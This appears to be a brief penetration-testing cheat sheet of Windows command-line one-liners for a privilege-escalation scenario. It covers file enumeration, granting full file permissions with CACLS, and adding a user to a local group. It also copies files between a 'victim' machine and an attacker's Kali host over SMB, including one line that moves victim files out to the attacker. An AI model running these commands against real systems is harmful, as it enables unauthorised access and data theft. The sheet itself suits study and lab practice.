# folder enumeration

```cmd
dir <file*> /S /B
```

# set full permission

```cmd
CACLS file_path /e /p <user>:F
```

# add user to group

```cmd
net localgroup <group> <user> /add
```

# move files from attacker to victim via smb share

```cmd
copy \\<lhost>\kali\<some-file> C:\PrivEsc\<some-file>
```

# move files from victiom to attacker via smb share

```cmd
copy C:\PrivEsc\<some-file> \\<lhost>\kali\<some-file>
```
